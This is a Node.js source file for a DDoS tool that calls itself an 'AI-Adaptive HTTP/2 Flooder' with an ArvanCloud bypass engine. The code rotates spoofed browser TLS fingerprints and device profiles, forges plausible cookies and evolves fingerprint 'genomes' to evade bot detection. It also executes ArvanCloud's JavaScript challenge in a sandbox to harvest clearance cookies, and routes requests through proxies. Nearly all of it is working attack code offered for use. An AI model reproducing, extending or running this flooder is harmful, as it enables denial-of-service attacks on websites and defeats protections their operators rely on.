// lang: JavaScript (Node.js), file: Koldvein.js, target: Linux/Windows, Node 18+
// Koldvein L7 — AI-Adaptive HTTP/2 Flooder + ArvanCloud Bypass Engine
// flags: -bypass | -redirect | -origin | -c | -v <1|2> | -s
'use strict';

const net    = require('net');
const fs     = require('fs');
const os     = require('os');
const cluster= require('cluster');
const tls    = require('tls');
const HPACK  = require('hpack');
const crypto = require('crypto');
const vm     = require('vm');
const dns    = require('dns');
const https  = require('https');
const http   = require('http');

// ── suppress noise ────────────────────────────────────────────────────────────
const IGNORE_CODES = new Set([
    'ECONNRESET','ECONNREFUSED','EPIPE','EHOSTUNREACH','ETIMEDOUT','ESOCKETTIMEDOUT',
    'EPROTO','EAI_AGAIN','EHOSTDOWN','ENETRESET','ENETUNREACH','ENOTCONN','ENOTFOUND',
    'EADDRNOTAVAIL','ECONNABORTED','EINPROGRESS','EINTR','EINVAL','EMFILE','ENOBUFS',
    'ENOSPC','ENOTSOCK','EOPNOTSUPP','ESHUTDOWN','UNKNOWN',
    'DEPTH_ZERO_SELF_SIGNED_CERT','UNABLE_TO_VERIFY_LEAF_SIGNATURE',
    'CERT_HAS_EXPIRED','CERT_NOT_YET_VALID','ERR_SOCKET_BAD_PORT',
    'ERR_TLS_CERT_ALTNAME_INVALID','ERR_SSL_WRONG_VERSION_NUMBER',
    'HPE_INVALID_METHOD','HPE_INVALID_URL','SELF_SIGNED_CERT_IN_CHAIN',
    'ERR_ASSERTION','ERR_STREAM_DESTROYED',
]);
const IGNORE_NAMES = new Set([
    'RequestError','StatusCodeError','TimeoutError','FetchError','SocketError','ParseError',
]);
require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);
process.emitWarning = () => {};
process
    .on('uncaughtException',  e => { if (!IGNORE_CODES.has(e.code) && !IGNORE_NAMES.has(e.name)) {} })
    .on('unhandledRejection', e => { if (e && !IGNORE_CODES.has(e.code) && !IGNORE_NAMES.has(e.name)) {} })
    .on('SIGHUP',   () => {})
    .on('SIGCHILD', () => {});

// ═══════════════════════════════════════════════════════════════════════════════
// CONSTANTS
// ═══════════════════════════════════════════════════════════════════════════════
const MAX_REDIRECTS    = 10;
const BYPASS_TTL       = 24 * 60 * 1000;   // 24 min cookie validity
const RAM_WATCH_MS     = 2500;
const RAM_KILL_PCT     = 0.97;
const HEAP_KILL_PCT    = 0.93;
const TUNE_MS          = 1800;
const STATS_MS         = 700;
const RESTART_STAGGER  = 55;
const AI_LEARN_MS      = 3000;             // how often AI agent emits new genome
const AI_POOL_SIZE     = 40;               // genomes in circulation per worker

// ═══════════════════════════════════════════════════════════════════════════════
// 2026 TLS GENOME — cipher + sigalg sets the AI mutates over
// Each genome is a full TLS fingerprint config. The agent tracks which ones
// land 2xx/503 (good signal) vs 403/RST (fingerprint detected) and promotes
// surviving genomes while killing detected ones.
// ═══════════════════════════════════════════════════════════════════════════════
const CIPHER_POOL = [
    // Chrome 136 order
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
    // Safari 19 order
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:AES256-GCM-SHA384:AES128-GCM-SHA256',
    // Firefox 134 order
    'TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384',
    // Samsung Internet 27
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-CHACHA20-POLY1305:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA',
    // Edge 132 mobile
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-GCM-SHA256',
];

const SIGALG_POOL = [
    // Chrome/Android
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512',
    // Safari/iOS
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
    // Firefox
    'ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512',
    // Edge/Chromium mobile
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512:ecdsa_secp521r1_sha512',
];

const TLS_SECURE_OPTS =
    crypto.constants.SSL_OP_NO_RENEGOTIATION |
    crypto.constants.SSL_OP_NO_TICKET        |
    crypto.constants.SSL_OP_NO_SSLv2         |
    crypto.constants.SSL_OP_NO_SSLv3         |
    crypto.constants.SSL_OP_NO_COMPRESSION   |
    crypto.constants.SSL_OP_ALL              |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_TLSEXT_PADDING;

function makeTLSOpts(genome, extra) {
    return Object.assign({
        ciphers:        genome.ciphers,
        sigalgs:        genome.sigalgs,
        secureOptions:  TLS_SECURE_OPTS,
        minVersion:     'TLSv1.2',
        maxVersion:     'TLSv1.3',
        rejectUnauthorized: false,
    }, extra || {});
}

// ═══════════════════════════════════════════════════════════════════════════════
// AI GENOME ENGINE
// — A genome = { ciphers, sigalgs, profile, cookieStyle }
// — Each worker maintains a pool of AI_POOL_SIZE genomes
// — After every request, the genome that sent it gets scored:
//     2xx/503 → survival score +2   (reached server)
//     403/RST → survival score -3   (fingerprint caught)
//     429     → survival score -1   (rate limited, not caught)
//     err/to  → survival score -0.5 (proxy issue, neutral)
// — Every AI_LEARN_MS: bottom 30% killed, top 70% breed mutations
// — Mutations: swap cipher set, swap sigalg set, mutate profile, mutate cookie
// — The gene pool converges on what ArvanCloud doesn't detect
// ═══════════════════════════════════════════════════════════════════════════════

// Device profile pool — 2026 high-end mobile, full fingerprint
const PROFILES = [
    // Android Chrome 136
    { id:'ac136', platform:'Android', browser:'Chrome',
      ua:'Mozilla/5.0 (Linux; Android 16; SM-S938B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:'"Google Chrome";v="136", "Chromium";v="136", "Not.A/Brand";v="99"',
      secMobile:'?1', platformHint:'"Android"',
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1',
      vw:412, dpr:'3.5' },
    { id:'ac136b', platform:'Android', browser:'Chrome',
      ua:'Mozilla/5.0 (Linux; Android 16; Pixel 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.60 Mobile Safari/537.36',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:'"Google Chrome";v="136", "Chromium";v="136", "Not.A/Brand";v="99"',
      secMobile:'?1', platformHint:'"Android"',
      fetchDest:'document', fetchMode:'navigate', fetchSite:'cross-site', fetchUser:'?1',
      vw:393, dpr:'3' },
    // Android Chrome 133
    { id:'ac133', platform:'Android', browser:'Chrome',
      ua:'Mozilla/5.0 (Linux; Android 15; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.123 Mobile Safari/537.36',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:'"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="99"',
      secMobile:'?1', platformHint:'"Android"',
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1',
      vw:412, dpr:'3.5' },
    // Android Chrome 131
    { id:'ac131', platform:'Android', browser:'Chrome',
      ua:'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:'"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
      secMobile:'?1', platformHint:'"Android"',
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1',
      vw:412, dpr:'3.5' },
    // Android Firefox 134
    { id:'aff134', platform:'Android', browser:'Firefox',
      ua:'Mozilla/5.0 (Android 15; Mobile; rv:134.0) Gecko/134.0 Firefox/134.0',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.5',
      chua:null, secMobile:null, platformHint:null, fetchUser:null,
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none',
      vw:412, dpr:'3.5' },
    // Samsung Internet 27
    { id:'si27', platform:'Android', browser:'Samsung',
      ua:'Mozilla/5.0 (Linux; Android 15; SM-S936B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/27.0 Chrome/131.0.0.0 Mobile Safari/537.36',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
      acceptEnc:'gzip, deflate, br', acceptLang:'en-US,en;q=0.9',
      chua:'"Samsung Internet";v="27.0", "Chromium";v="131", "Not_A Brand";v="8"',
      secMobile:'?1', platformHint:'"Android"',
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1',
      vw:412, dpr:'3.5' },
    // iOS Safari 19
    { id:'s19', platform:'iOS', browser:'Safari',
      ua:'Mozilla/5.0 (iPhone; CPU iPhone OS 19_0 like Mac OS X) AppleWebKit/619.1.15 (KHTML, like Gecko) Version/19.0 Mobile/22A5307m Safari/604.1',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:null, secMobile:null, platformHint:null, fetchUser:null,
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none',
      vw:430, dpr:'3' },
    // iOS Safari 18
    { id:'s18', platform:'iOS', browser:'Safari',
      ua:'Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/618.3.11 (KHTML, like Gecko) Version/18.5 Mobile/22F82 Safari/604.1',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:null, secMobile:null, platformHint:null, fetchUser:null,
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none',
      vw:430, dpr:'3' },
    // iOS CriOS 131
    { id:'crios131', platform:'iOS', browser:'Chrome',
      ua:'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/617.4.5 (KHTML, like Gecko) CriOS/131.0.6778.73 Mobile/15E148 Safari/604.1',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:'"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
      secMobile:'?1', platformHint:'"iOS"', fetchUser:'?1',
      fetchDest:'document', fetchMode:'navigate', fetchSite:'cross-site',
      vw:390, dpr:'3' },
    // iPad Safari 18
    { id:'ipads18', platform:'iOS', browser:'Safari',
      ua:'Mozilla/5.0 (iPad; CPU OS 18_3_1 like Mac OS X) AppleWebKit/617.4.5 (KHTML, like Gecko) Version/18.3.1 Mobile/22D72 Safari/604.1',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:null, secMobile:null, platformHint:null, fetchUser:null,
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none',
      vw:1024, dpr:'2' },
    // Xiaomi 15 Ultra Chrome 133
    { id:'xi15', platform:'Android', browser:'Chrome',
      ua:'Mozilla/5.0 (Linux; Android 15; 24112RKD7G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6943.83 Mobile Safari/537.36',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'zh-CN,zh;q=0.9,en;q=0.8',
      chua:'"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="99"',
      secMobile:'?1', platformHint:'"Android"',
      fetchDest:'document', fetchMode:'navigate', fetchSite:'none', fetchUser:'?1',
      vw:393, dpr:'3' },
    // OnePlus 13 Chrome 132
    { id:'op13', platform:'Android', browser:'Chrome',
      ua:'Mozilla/5.0 (Linux; Android 15; CPH2687) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6834.83 Mobile Safari/537.36',
      accept:'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      acceptEnc:'gzip, deflate, br, zstd', acceptLang:'en-US,en;q=0.9',
      chua:'"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="99"',
      secMobile:'?1', platformHint:'"Android"',
      fetchDest:'document', fetchMode:'navigate', fetchSite:'cross-site', fetchUser:'?1',
      vw:412, dpr:'3' },
];

// Cookie engine — realistic session state, not random junk
// Generates plausible cookie sets matching the device profile
const COOKIE_SCHEMAS = {
    Chrome_Android: () => {
        const sid = crypto.randomBytes(16).toString('hex');
        const gid = `GA1.1.${Math.floor(Math.random()*2e9)}.${Math.floor(Date.now()/1000)-rndInt(0,86400*30)}`;
        const ga  = `GA1.1.${Math.floor(Math.random()*2e9)}.${Math.floor(Date.now()/1000)-rndInt(0,86400*90)}`;
        const parts = [`_ga=${ga}`,`_gid=${gid}`];
        if (Math.random()>0.5) parts.push(`_ga_${crypto.randomBytes(4).toString('hex').toUpperCase()}=GS2.1.${Math.floor(Date.now()/1000)}.${rndInt(1,30)}.${rndInt(0,1)}.${Math.floor(Date.now()/1000)-rndInt(0,1800)}.0.0.0`);
        if (Math.random()>0.6) parts.push(`session=${sid}`);
        if (Math.random()>0.7) parts.push(`pref=v1:${crypto.randomBytes(8).toString('base64url')}`);
        return parts.join('; ');
    },
    Safari_iOS: () => {
        const parts = [];
        if (Math.random()>0.4) parts.push(`_ga=GA1.1.${Math.floor(Math.random()*2e9)}.${Math.floor(Date.now()/1000)-rndInt(0,86400*60)}`);
        if (Math.random()>0.5) parts.push(`_session=${crypto.randomBytes(12).toString('base64url')}`);
        if (Math.random()>0.6) parts.push(`lang=${rnd(['en','en-US','en-GB'])}`);
        if (Math.random()>0.7) parts.push(`tz=${rnd(['UTC','America/New_York','Europe/London','Asia/Tokyo'])}`);
        return parts.join('; ');
    },
    Firefox_Android: () => {
        const parts = [];
        if (Math.random()>0.5) parts.push(`_ga=GA1.1.${Math.floor(Math.random()*2e9)}.${Math.floor(Date.now()/1000)-rndInt(0,86400*45)}`);
        if (Math.random()>0.6) parts.push(`__utmz=1.${Math.floor(Date.now()/1000)}.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)`);
        if (Math.random()>0.5) parts.push(`token=${crypto.randomBytes(20).toString('hex')}`);
        return parts.join('; ');
    },
    Samsung_Android: () => {
        const parts = [`_ga=GA1.1.${Math.floor(Math.random()*2e9)}.${Math.floor(Date.now()/1000)-rndInt(0,86400*30)}`];
        if (Math.random()>0.5) parts.push(`samsung_browser_session=${crypto.randomBytes(10).toString('hex')}`);
        if (Math.random()>0.6) parts.push(`_gid=GA1.1.${Math.floor(Math.random()*2e9)}.${Math.floor(Date.now()/1000)-rndInt(0,86400)}`);
        return parts.join('; ');
    },
};

function getCookieForProfile(p) {
    if (p.platform === 'iOS' && p.browser === 'Safari') return COOKIE_SCHEMAS.Safari_iOS();
    if (p.browser === 'Firefox')  return COOKIE_SCHEMAS.Firefox_Android();
    if (p.browser === 'Samsung')  return COOKIE_SCHEMAS.Samsung_Android();
    return COOKIE_SCHEMAS.Chrome_Android();
}

// ── genome factory ────────────────────────────────────────────────────────────
function newGenome() {
    return {
        id:       crypto.randomBytes(4).toString('hex'),
        ciphers:  rnd(CIPHER_POOL),
        sigalgs:  rnd(SIGALG_POOL),
        profile:  rnd(PROFILES),
        score:    0,
        uses:     0,
    };
}

function breedGenome(a, b) {
    return {
        id:      crypto.randomBytes(4).toString('hex'),
        ciphers: Math.random() > 0.5 ? a.ciphers : b.ciphers,
        sigalgs: Math.random() > 0.5 ? a.sigalgs : b.sigalgs,
        profile: Math.random() > 0.5 ? a.profile : b.profile,
        score:   0,
        uses:    0,
    };
}

function mutateGenome(g) {
    const m = Object.assign({}, g, { id: crypto.randomBytes(4).toString('hex'), score:0, uses:0 });
    const r = Math.random();
    if (r < 0.33) m.ciphers = rnd(CIPHER_POOL);
    else if (r < 0.66) m.sigalgs = rnd(SIGALG_POOL);
    else m.profile = rnd(PROFILES);
    return m;
}

class GenePool {
    constructor(size) {
        this.size   = size;
        this.pool   = Array.from({ length: size }, newGenome);
        this.cursor = 0;
    }

    pick() {
        // weighted: score + 1 so new genomes get a chance
        const weights = this.pool.map(g => Math.max(0.1, g.score + 5));
        const total   = weights.reduce((a, b) => a + b, 0);
        let   n       = Math.random() * total;
        for (let i = 0; i < this.pool.length; i++) {
            n -= weights[i];
            if (n <= 0) return this.pool[i];
        }
        return this.pool[0];
    }

    reward(id, delta) {
        const g = this.pool.find(x => x.id === id);
        if (g) { g.score += delta; g.uses++; }
    }

    // evolve: kill bottom 30%, breed from top 50%, add 20% fresh
    evolve() {
        this.pool.sort((a, b) => b.score - a.score);
        const keepN  = Math.floor(this.size * 0.70);
        const kept   = this.pool.slice(0, keepN);
        const freshN = Math.floor(this.size * 0.20);
        const breedN = this.size - keepN - freshN;
        const bred   = [];
        for (let i = 0; i < breedN; i++) {
            const a = kept[rndInt(0, Math.min(5, kept.length-1))];
            const b = kept[rndInt(0, Math.min(10, kept.length-1))];
            bred.push(Math.random() > 0.4 ? breedGenome(a, b) : mutateGenome(a));
        }
        const fresh = Array.from({ length: freshN }, newGenome);
        this.pool = [...kept, ...bred, ...fresh];
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// ARVANCLOUD BYPASS ENGINE
// Multi-strategy, no browser, no puppeteer.
// Strategy 1: vm sandbox — extract challenge scripts, execute synchronously
// Strategy 2: pattern extraction — ArvanCloud often embeds the cookie values
//             directly in the script as computed hex. Try to extract without exec.
// Strategy 3: if both fail, mark and retry with refreshed request.
// ═══════════════════════════════════════════════════════════════════════════════
const BYPASS_CACHE = new Map();

function isArvanPage(body) {
    return typeof body === 'string'
        && body.includes('__arcsjs')
        && body.includes('__arcsjsc')
        && (body.includes('Transferring to the website') || body.includes('arvan'));
}

function extractChallengeScripts(html) {
    const scripts = [];
    const re = /<script[^>]*type\s*=\s*["']text\/javascript["'][^>]*>([\s\S]*?)<\/script>|<script(?![^>]*src)[^>]*>([\s\S]*?)<\/script>/gi;
    let m;
    while ((m = re.exec(html)) !== null) {
        const src = (m[1] || m[2] || '').trim();
        if (src && (src.includes('__arcsjs') || src.includes('arcookie') || src.includes('__arcsjsc'))) {
            scripts.push(src);
        }
    }
    return scripts;
}

function patchScript(src) {
    return src
        // DOMContentLoaded
        .replace(/document\.addEventListener\s*\(\s*["']DOMContentLoaded["']\s*,\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{/g, '(function(){')
        // window.onload
        .replace(/window\.onload\s*=\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{/g, '(function(){')
        // setTimeout(fn, delay)
        .replace(/setTimeout\s*\(\s*(?:function\s*\([^)]*\)|\([^)]*\)\s*=>)\s*\{/g, '(function(){')
        // closing }, delay) patterns
        .replace(/\}\s*,\s*(?:getRandomInt\s*\([^)]*\)|\d+)\s*\)/g, '})()')
        // bare trailing })
        .replace(/\}\s*\)\s*;?\s*$/m, '})();');
}

function makeSandbox(cookieJar) {
    const nav = {
        userAgent:'Mozilla/5.0 (Linux; Android 15; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.135 Mobile Safari/537.36',
        language:'en-US', languages:['en-US','en'], platform:'Linux armv8l',
        hardwareConcurrency:8, maxTouchPoints:5, cookieEnabled:true,
        connection:{ effectiveType:'4g', rtt:50, downlink:10 },
    };
    const doc = new Proxy({ _cookie:{} }, {
        set(t, p, v) {
            if (p==='cookie') _parseCookie(String(v), cookieJar);
            else t[p]=v;
            return true;
        },
        get(t, p) {
            if (p==='cookie')           return Object.entries(cookieJar).map(([k,v])=>`${k}=${v}`).join('; ');
            if (p==='addEventListener') return ()=>{};
            if (p==='removeEventListener') return ()=>{};
            if (p==='createElement')    return tag=>({ tagName:tag.toUpperCase(),style:{},innerHTML:'',setAttribute:()=>{},getAttribute:()=>null,appendChild:()=>{} });
            if (p==='getElementById')   return ()=>null;
            if (p==='querySelector')    return ()=>null;
            if (p==='querySelectorAll') return ()=>[];
            if (p==='readyState')       return 'complete';
            if (p==='domain')           return '';
            if (p==='referrer')         return '';
            if (p==='body')             return { appendChild:()=>{} };
            if (p==='head')             return { appendChild:()=>{} };
            return t[p];
        }
    });
    const win = {
        document:doc, navigator:nav,
        screen:{ width:412, height:892, colorDepth:24, pixelDepth:24, availWidth:412, availHeight:892 },
        innerWidth:412, innerHeight:892, outerWidth:412, outerHeight:892,
        devicePixelRatio:3.5,
        location:{ reload:()=>{}, href:'https://target.placeholder/', hostname:'target.placeholder', pathname:'/', search:'', protocol:'https:', port:'' },
        history:{ length:rndInt(1,5), pushState:()=>{}, replaceState:()=>{} },
        performance:{ now:()=>Date.now()-1000+Math.random()*500, timing:{ navigationStart:Date.now()-rndInt(500,3000) } },
        crypto:{
            getRandomValues: arr=>{
                for(let i=0;i<arr.length;i++) arr[i]=crypto.randomInt(256);
                return arr;
            },
            subtle:{ digest: async (alg,data)=>{
                const h=crypto.createHash(alg.replace('-','').toLowerCase());
                h.update(Buffer.from(data));
                return h.digest().buffer;
            }},
        },
        addEventListener:()=>{}, removeEventListener:()=>{},
        setTimeout:  fn=>{ if(typeof fn==='function') try{fn()}catch{} },
        clearTimeout:()=>{},
        setInterval: ()=>0,
        clearInterval:()=>{},
        requestAnimationFrame: fn=>{ if(typeof fn==='function') try{fn(performance.now())}catch{} },
        atob:  s=>Buffer.from(s,'base64').toString('binary'),
        btoa:  s=>Buffer.from(s,'binary').toString('base64'),
        encodeURIComponent, decodeURIComponent, encodeURI, decodeURI,
        String,Number,Boolean,Math,Date,Array,Object,RegExp,Error,Map,Set,Promise,JSON,
        parseInt,parseFloat,isNaN,isFinite,Symbol,Proxy,Reflect,
        console:{ log:()=>{}, warn:()=>{}, error:()=>{}, debug:()=>{} },
        TextEncoder: require('util').TextEncoder,
        TextDecoder: require('util').TextDecoder,
        Uint8Array, ArrayBuffer, DataView, Int8Array, Uint16Array, Int32Array, Float32Array, Float64Array,
    };
    win.window=win; win.self=win; win.global=win; win.globalThis=win;
    return win;
}

function _parseCookie(str, jar) {
    const pair = str.split(';')[0].trim();
    const eq   = pair.indexOf('=');
    if (eq < 1) return;
    const k = pair.slice(0, eq).trim();
    const v = decodeURIComponent(pair.slice(eq+1).trim().replace(/^"+|"+$/g,''));
    if (k) jar[k] = v;
}

// Try to extract cookies without vm execution (fast path)
// ArvanCloud sometimes writes the final cookie value as a hex literal
function tryStaticExtract(html) {
    const arcsjs  = html.match(/document\.cookie\s*=\s*["']?__arcsjs=([^;"'\s]+)/);
    const arcsjsc = html.match(/document\.cookie\s*=\s*["']?__arcsjsc=([^;"'\s]+)/);
    if (arcsjs && arcsjsc) {
        return `__arcsjs=${arcsjs[1]}; __arcsjsc=${arcsjsc[1]}`;
    }
    return null;
}

function solveArvanChallenge(html) {
    // fast path
    const fast = tryStaticExtract(html);
    if (fast) return fast;

    // vm path — try every script block
    const scripts = extractChallengeScripts(html);
    if (scripts.length === 0) throw new Error('no challenge scripts found');

    const jar = {};
    for (const raw of scripts) {
        try {
            const patched = patchScript(raw);
            const sandbox = makeSandbox(jar);
            vm.runInContext(patched, vm.createContext(sandbox), { timeout:7000 });
            if (jar['__arcsjs'] && jar['__arcsjsc']) break;
        } catch { /* try next */ }
    }

    if (!jar['__arcsjs'] || !jar['__arcsjsc'])
        throw new Error(`cookies not set after ${scripts.length} scripts. got: ${Object.keys(jar).join(',')}`);

    return `__arcsjs=${jar['__arcsjs']}; __arcsjsc=${jar['__arcsjsc']}`;
}

function unchunk(body) {
    let out='', pos=0;
    while (pos < body.length) {
        const nl = body.indexOf('\r\n', pos);
        if (nl===-1) break;
        const sz = parseInt(body.slice(pos, nl).trim(), 16);
        if (isNaN(sz) || sz===0) break;
        out += body.slice(nl+2, nl+2+sz);
        pos  = nl+2+sz+2;
    }
    return out;
}

// Bypass preflight — one TLS connection per proxy slot, solves and caches
function runBypassPreflight(urlObj, proxy, genome, cb) {
    const key    = `${proxy}|${urlObj.hostname}`;
    const cached = BYPASS_CACHE.get(key);
    if (cached && Date.now()-cached.ts < BYPASS_TTL) { cb(cached.str); return; }

    const {ph, pp} = splitProxy(proxy);
    if (!ph) { cb(''); return; }
    const port = urlObj.port ? +urlObj.port : 443;

    const sock = net.connect(pp, ph, ()=>{
        sock.once('data', ()=>{
            const tlsOpts = makeTLSOpts(genome, {
                socket: sock, servername: urlObj.hostname,
                ALPNProtocols:['http/1.1'], timeout:10000,
            });
            const ts = tls.connect(tlsOpts, ()=>{
                const req = [
                    `GET ${urlObj.pathname||'/'}${urlObj.search||''} HTTP/1.1`,
                    `Host: ${urlObj.hostname}`,
                    `User-Agent: ${genome.profile.ua}`,
                    `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
                    `Accept-Encoding: identity`,
                    `Accept-Language: ${genome.profile.acceptLang}`,
                    `Sec-Fetch-Dest: document`,
                    `Sec-Fetch-Mode: navigate`,
                    `Sec-Fetch-Site: none`,
                    `Upgrade-Insecure-Requests: 1`,
                    `Connection: close`,
                    '',''
                ].join('\r\n');
                let raw=Buffer.alloc(0), done=false;
                const fin = ()=>{
                    if(done) return; done=true;
                    ts.destroy(); sock.destroy();
                    _processResponse(raw, key, cb);
                };
                ts.write(req);
                ts.setTimeout(10000);
                ts.on('data',  c=>{ raw=Buffer.concat([raw,c]); if(raw.length>65536) fin(); });
                ts.on('end',   fin);
                ts.on('close', fin);
                ts.on('timeout', fin);
                ts.on('error', ()=>{ if(!done){done=true;cb('');} });
            });
            ts.on('error', ()=>{ sock.destroy(); cb(''); });
        });
        sock.write(`CONNECT ${urlObj.hostname}:${port} HTTP/1.1\r\nHost: ${urlObj.hostname}:${port}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
